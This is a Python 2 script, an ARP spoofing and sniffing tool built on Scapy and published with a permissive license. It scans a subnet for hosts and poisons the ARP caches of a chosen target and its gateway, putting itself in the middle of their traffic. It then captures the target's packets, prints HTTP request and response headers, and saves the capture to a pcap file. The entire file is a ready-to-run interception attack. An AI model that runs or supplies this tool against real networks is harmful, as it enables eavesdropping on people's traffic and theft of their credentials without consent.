from scapy.all import *
from socket import *
import os
import re
import sys
import threading

# Author: Osanda Malith Jayathissa
# http://osandamalith.wordpress.com
'''
        DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
                    Version 2, December 2004 

 Copyright (C) 2015 Osanda Malith Jayathissa <osanda@unseen.is> 

 Everyone is permitted to copy and distribute verbatim or modified 
 copies of this license document, and changing it is allowed as long 
 as the name is changed. 

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION 

  0. You just DO WHAT THE FUCK YOU WANT TO.
'''

class ARPObj(object):
    """The main class for the ARP Spoofer"""
    def __init__(self, **kwargs):
        super(ARPObj, self).__init__()
        self._arg = kwargs
        
    @property
    def gateway_ip(self):
        return self._arg.get('gateway_ip', None)

    @gateway_ip.setter
    def gateway_ip(self, g_ip):
        self._arg['gateway_ip'] = g_ip

    @gateway_ip.deleter
    def gateway_ip(self):
        del self._arg['gateway_ip'] 

    @property
    def gateway_mac(self):
        return self._arg.get('gateway_mac', None)

    @gateway_mac.setter
    def gateway_mac(self, g_mac):
        self._arg['gateway_mac'] = g_mac

    @gateway_mac.deleter
    def gateway_mac(self):
        del self._arg['gateway_mac'] 

    @property
    def target_ip(self):
        return self._arg.get('target_ip', None)

    @target_ip.setter
    def target_ip(self, t_ip):
        self._arg['target_ip'] = t_ip

    @target_ip.deleter
    def target_ip(self):
        del self._arg['target_ip'] 

    @property
    def target_mac(self):
        return self._arg.get('target_mac', None)

    @target_mac.setter
    def target_mac(self, t_mac):
        self._arg['target_mac'] = t_mac

    @target_mac.deleter
    def target_mac(self):
        del self._arg['target_mac'] 

    
    def restore_target(self):
        
        print "[*] Restoring target..."
        send(ARP(op=2, psrc=self._arg['gateway_ip'] , pdst=self._arg['target_ip'] , hwdst="ff:ff:ff:ff:ff:ff",hwsrc=self._arg['gateway_mac'] ),count=5)
        send(ARP(op=2, psrc=self._arg['target_ip'] , pdst=self._arg['gateway_ip'] , hwdst="ff:ff:ff:ff:ff:ff",hwsrc=self._arg['target_mac'] ),count=5)
        
    
        
    def poison_target(self):
        global poisoning
       
        poison_target = ARP()
        poison_target.op   = 2
        poison_target.psrc = self._arg['gateway_ip'] 
        poison_target.pdst = self._arg['target_ip'] 
        poison_target.hwdst= self._arg['target_mac'] 

        poison_gateway = ARP()
        poison_gateway.op   = 2
        poison_gateway.psrc = self._arg['target_ip'] 
        poison_gateway.pdst = self._arg['gateway_ip'] 
        poison_gateway.hwdst= self._arg['gateway_mac'] 

        print "[*] Beginning the ARP poison. [CTRL-C to stop]"

        while poisoning:
            send(poison_target)
            send(poison_gateway)
              
            time.sleep(2)
              
        print "[*] ARP poison attack finished."

        return

def get_mac(ip_address):
        
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
        for s,r in responses:
            return r[Ether].src
        
        return None

def run(network):
    print ''
    for ip in xrange(1,256):
        addr = network + str(ip)
        if is_up(addr):
            print '%s \t- %s' %(addr, getfqdn(addr)) 
    print   

def is_up(addr):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(0.01)  
    if not s.connect_ex((addr,135)):   
        s.close()                       
        return 1
    else:
        s.close()

def scan():
    network = raw_input("Enter the network address: ")
    run(network)

def filterhttp(p):
    if p.haslayer(Raw):
        packet=str(p["Raw"])
        header = packet.split("\r\n")

        if re.match("^GET.+",header[0]):
            printHttpHeader(header)
        elif re.match("^POST.+",header[0]):
            printHttpHeader(header)
        elif re.match("^HTTP.+",header[0]):
            del header[len(header)-1]
            printHttpHeader(header)
    else:
        pass

def printHttpHeader(h):
    
    for i in h:
        print str(i)
    print "*"*71

poisoning = True

def arpscanner(ips):
    for lsb in range(1,255):
        ip = ips+str(lsb)
        arpReq = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        arpResp = srp1(arpReq, timeout=1,verbose=0, retry=0, multi=0)
        if arpResp:
            print "IP: " + arpResp.psrc + " Mac: " + arpResp.hwsrc


def main():
    while True:
        print '''
[*] Welcome to Simple ARP Spoofer
[*] Author: Osanda Malith Jayathissa
[*] Follow @OsandaMalith

Choose a Option:

1. Scan IP range (hunt for windows hosts)
2. ARP Scanner
3. Perform ARP Attack
'''
        inp = int(raw_input("Enter Choice: "))
        if inp == 1: 
            scan()
            break
        if inp == 2:
            ips = str(raw_input("Enter your IP Range: "))
            arpscanner(ips)
            break
        elif inp == 3:
            break


    ARP_Obj = ARPObj()
    interface = str(raw_input("Enter the interface: "))
    ARP_Obj.target_ip = str(raw_input("Enter the target ip: "))
    ARP_Obj.gateway_ip = str(raw_input("Enter the gateway ip: "))
    packet_count = int(raw_input("Enter the packet count: "))

    conf.iface = interface

    # turn off output
    conf.verb  = 0

    print "[*] Setting up %s" % interface

    ARP_Obj.gateway_mac = get_mac(ARP_Obj.gateway_ip)

    if ARP_Obj.gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (ARP_Obj.gateway_ip,ARP_Obj.gateway_mac)

    ARP_Obj.target_mac = get_mac(ARP_Obj.target_ip)

    if ARP_Obj.target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (ARP_Obj.target_ip, ARP_Obj.target_mac)
        
    # start poison thread
    poison_thread = threading.Thread(target=ARP_Obj.poison_target)
    poison_thread.start()
    #ARP_Obj.poison_target()

    try:
        print "[*] Starting sniffer for %d packets" % packet_count
        
        bpf_filter  = "ip host %s" % ARP_Obj.target_ip
        packets = sniff(count=packet_count,filter=bpf_filter,iface=interface,prn=filterhttp)
        
    except KeyboardInterrupt:
        pass

    finally:
        # write out the captured packets
        print "[*] Writing packets to arper.pcap"
        wrpcap('arper.pcap',packets)
        global poisoning
        poisoning = False
        time.sleep(2)
        ARP_Obj.restore_target()
        sys.exit(0)

if __name__ == '__main__':
    main()
